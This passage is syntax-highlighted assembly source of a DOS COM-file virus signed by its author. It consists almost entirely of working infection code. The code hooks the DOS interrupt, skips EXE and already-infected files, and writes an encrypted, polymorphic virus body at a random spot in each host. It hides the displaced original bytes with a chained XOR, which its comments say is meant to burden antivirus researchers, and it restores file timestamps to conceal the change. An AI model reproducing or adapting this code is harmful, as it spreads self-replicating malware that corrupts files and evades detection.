                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">error_opening</span><span class="sc0">           </span><span class="sc1">; if error occoured</span><span class="sc0">

</span><span class="sc5">ok_writing</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">                </span><span class="sc1">; open for RW</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">ok_open</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">error_opening_att</span><span class="sc0">
</span><span class="sc5">ok_open</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; BX handle</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; store date and time</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filedate</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filetime</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; read from file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_old</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">first_old</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">    </span><span class="sc1">; MZ ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_buffer_err</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">first_old</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">    </span><span class="sc1">; ZM ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_buffer_err</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">first_old</span><span class="sc4">],</span><span class="sc12">'KP'</span><span class="sc0">    </span><span class="sc1">; Pklited? :))</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ok_buffer</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">first_old</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0e9h</span><span class="sc0">  </span><span class="sc1">; jump after PK?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ok_buffer</span><span class="sc0">
</span><span class="sc5">exit_buffer_err</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_nofile</span><span class="sc0">

</span><span class="sc5">ok_buffer</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">go_body_pos</span><span class="sc0">             </span><span class="sc1">; seek to end</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_pos</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc1">; check file lenght</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">0fadeh</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; enough space?</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">bad_lenght</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2000d</span><span class="sc0">                </span><span class="sc1">; not too short</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">ok_file</span><span class="sc0">
</span><span class="sc5">bad_lenght</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_nofile</span><span class="sc0">
</span><span class="sc5">ok_file</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; cx=file lenght</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">virus_size</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">random_place</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; get random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; from 05 to Fsize-vsize</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">random_place</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">random_place</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">virus_pos</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">go_body_pos</span><span class="sc0">             </span><span class="sc1">; go to random position in file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; read what will be overwritten</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_pos</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">go_body_pos</span><span class="sc0">             </span><span class="sc1">; go to the end-5</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; read last 5 bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last_four</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_four</span><span class="sc4">],</span><span class="sc12">'SN'</span><span class="sc0">    </span><span class="sc1">; special coms?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_nofile</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_buffer</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dec_value</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">virus_end_mem</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">enc_dec_orig</span><span class="sc0">            </span><span class="sc1">; encrypt original bytes</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_oper</span><span class="sc0">              </span><span class="sc1">; write original bytes</span><span class="sc0">

                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; add random offset</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">011111b</span><span class="sc0">              </span><span class="sc1">; write some rnd bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">write_check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_oper</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">go_body_pos</span><span class="sc0">             </span><span class="sc1">; go to the sel. rnd pos</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_it</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_oper</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_nopoly</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encryptor</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_oper</span><span class="sc0">              </span><span class="sc1">; write virus body in file</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">go_body_pos</span><span class="sc0">             </span><span class="sc1">; go to start</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; ax = pos of virus body</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                  </span><span class="sc1">; - jump - 'PK'</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'KP'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0e9h</span><span class="sc0"> </span><span class="sc1">; code the jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_oper</span><span class="sc0">              </span><span class="sc1">; write the jump</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filedate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filetime</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                </span><span class="sc1">; restore date and time</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">exit_nofile</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                  </span><span class="sc1">; close file</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">error_opening_att</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">attrib_set</span><span class="sc0">

</span><span class="sc5">error_opening</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_24off</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_24seg</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; old int 24h handler</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">chain_old_21</span><span class="sc0">

</span><span class="sc5">author</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'-b0z0/iKx-'</span><span class="sc0">

</span><span class="sc1">; As for encryption of the original piece of code of the COM...</span><span class="sc0">
</span><span class="sc1">; Instead of using a more classic xor for each byte with a fixed value,</span><span class="sc0">
</span><span class="sc1">; the routine is somehow recursive. Infact when we are encrypting the</span><span class="sc0">
</span><span class="sc1">; key of the first byte is the second byte, the key for the second byte</span><span class="sc0">
</span><span class="sc1">; is the third byte and so on till the end, where the key for the last</span><span class="sc0">
</span><span class="sc1">; byte is the random value. So for the decryption the algorithm will</span><span class="sc0">
</span><span class="sc1">; be inverse, starting from the end and using the random value it will</span><span class="sc0">
</span><span class="sc1">; decrypt from the end to the start 'generating' in the same time the</span><span class="sc0">
</span><span class="sc1">; needed decryption keys...</span><span class="sc0">
</span><span class="sc1">; Maybe AVrs will have to spend some more bytes to restore this data</span><span class="sc0">
</span><span class="sc1">; comparing the restoration of the other too classic method ;))</span><span class="sc0">

</span><span class="sc5">enc_dec_orig</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">virus_size</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">data_encrypt</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; will be enc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; key</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">data_encrypt</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">dec_value</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">encrypt_it</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">; is BX</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_pointer</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">          </span><span class="sc1">; only SI or DI</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">encrypt_it</span><span class="sc0">
</span><span class="sc5">ok_pointer</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">         </span><span class="sc1">; inc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inc_memory</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; mov pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">virus_pos</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; pointer value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_change</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">; decryptor byte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                          </span><span class="sc1">; pointer dependant</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_change</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">no_change</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">change_register</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">change_register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">                         </span><span class="sc1">; add base</span><span class="sc0">
</span><span class="sc5">mody_oper</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">mody_oper</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ok_store</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                          </span><span class="sc1">; +28h = sub</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
